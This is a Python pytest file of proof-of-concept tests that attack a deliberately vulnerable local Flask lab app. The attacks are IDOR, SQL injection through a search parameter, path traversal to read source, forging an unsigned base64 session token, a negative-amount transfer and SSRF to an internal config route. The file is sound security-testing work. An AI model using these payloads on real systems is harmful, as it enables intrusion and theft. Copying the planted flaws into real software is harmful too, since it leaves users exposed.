"""Security PoCs — run against the VULNERABLE app, flaws expected present.

Each test documents one planted flaw with the minimum request necessary.
After applying remediation/, tests/regression/ must pass against the patched app.

Authorized target only: local Flask fixture on 127.0.0.1 owned by this repo.
See AUTHORIZATION.md.
"""
import base64
import os

import requests

BASE = os.environ.get("LAB_BASE_URL", "http://127.0.0.1:5000")


def test_001_idor_bob_note_readable_by_alice():
    """FINDING-001: no ownership check, alice reads bob's note id=3."""
    r = requests.get(f"{BASE}/note/3", params={"as": "alice"}, timeout=5)
    assert r.status_code == 200
    assert r.json()["owner"] == "bob"
    assert "bob private note" in r.json()["body"]


def test_002_search_sqli_returns_all_rows():
    """FINDING-002: interpolated LIKE lets the filter be closed and neutralized."""
    baseline = requests.get(f"{BASE}/search", params={"q": "zzz"}, timeout=5).json()
    assert baseline == []
    injected = requests.get(f"{BASE}/search", params={"q": "zzz%' OR '1'='1' -- "}, timeout=5).json()
    assert len(injected) >= 3, injected


def test_003_download_traversal_leaks_source():
    """FINDING-003: unsanitized join escapes files/ and reads app source."""
    r = requests.get(f"{BASE}/download", params={"f": "../app.py"}, timeout=5)
    assert r.status_code == 200
    assert "Flask" in r.text


def test_004_session_token_is_forgeable():
    """FINDING-004: token is base64(username), unsigned — forge bob's session."""
    issued = requests.get(f"{BASE}/login", params={"as": "alice"}, timeout=5).json()["token"]
    assert base64.b64decode(issued).decode() == "alice"

    forged = base64.b64encode(b"bob").decode()
    r = requests.get(f"{BASE}/me", headers={"X-Session-Token": forged}, timeout=5)
    assert r.status_code == 200
    assert r.json()["user"] == "bob"


def test_005_negative_transfer_reverses_funds():
    """FINDING-005: amount never validated positive — negative pulls from dst."""
    r = requests.post(f"{BASE}/transfer",
                      json={"from": "alice", "to": "bob", "amount": -50},
                      timeout=5)
    assert r.status_code == 200, r.text
    balances = r.json()
    assert balances["alice"] == 150, balances
    assert balances["bob"] == 50, balances


def test_006_ssrf_preview_reaches_internal_config():
    """FINDING-006: unrestricted fetch — internal-only route reachable via /preview."""
    target = f"{BASE}/internal/config"
    r = requests.get(f"{BASE}/preview", params={"url": target}, timeout=10)
    assert r.status_code == 200, r.text
    assert "SSRF-FIXTURE-SECRET" in r.text
